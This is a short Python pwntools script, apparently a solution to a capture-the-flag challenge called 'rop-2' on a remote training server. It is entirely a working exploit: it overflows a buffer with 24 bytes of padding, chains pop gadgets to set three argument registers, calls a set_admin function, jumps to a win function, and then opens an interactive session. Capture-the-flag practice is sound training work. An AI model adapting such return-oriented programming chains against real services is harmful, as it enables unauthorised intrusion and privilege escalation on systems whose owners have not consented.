from pwn import *

context.log_level = "debug"
context.arch = "amd64"

io = remote("skillsusa.cybr.club", 443, ssl=True, sni="rop-2")

# Find offsets of useful functions
pop_rdi =   0x00000000004011d7
pop_rsi =   0x00000000004011d9
pop_rdx =   0x00000000004011db
set_admin = 0x00000000004011e0
win = 0x0000000000401236


payload = b"A" * 24

payload += p64(pop_rdi)  
payload += p64(1)        # rdi = 1
payload += p64(pop_rsi)
payload += p64(2)        # rsi = 2
payload += p64(pop_rdx)
payload += p64(3)        # rdx = 3
payload += p64(set_admin)  # Call set_admin(1, 2, 3)


payload += p64(win)

# Send the payload
io.recvuntil(b"Enter a message:")
io.sendline(payload)


io.interactive()
